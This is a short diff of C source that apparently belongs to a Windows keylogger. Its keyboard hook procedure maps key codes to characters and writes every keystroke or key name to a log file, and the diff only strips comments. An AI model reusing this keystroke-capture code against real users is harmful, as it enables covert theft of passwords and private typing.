@@ -16,9 +16,9 @@ char getCharFromVK(DWORD vkCode) {
     int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);
 
     if (result == 1) {
-        return (char)buffer[0]; // Return the character typed
+        return (char)buffer[0];
     }
-    return 0; // For non-character keys
+    return 0;
 }
 
 char* getTimestamp() {
@@ -43,7 +43,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (ch) {
                 fprintf(logFile, "%c\n", ch);
             } else {
-                // For non-printable keys like Enter, Shift, etc.
                 char keyName[32];
                 UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
                 GetKeyNameText(scanCode << 16, keyName, sizeof(keyName));
